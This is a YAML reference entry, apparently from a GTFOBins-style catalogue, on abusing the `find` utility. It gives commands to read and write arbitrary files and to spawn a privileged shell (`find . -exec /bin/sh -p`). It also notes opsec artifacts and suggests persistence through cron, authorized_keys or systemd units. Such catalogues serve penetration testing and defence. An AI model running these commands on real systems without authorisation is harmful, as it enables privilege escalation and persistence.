---
name: find
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: find /path/to/input-file -exec cat {} \;
  notes: This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: find / -fprintf /path/to/output-file DATA -quit
  notes: '`DATA` is a format string, it supports some escape sequences.'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: find . -exec /bin/sh -p \; -quit
references:
- https://gtfobins.github.io/gtfobins/find/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
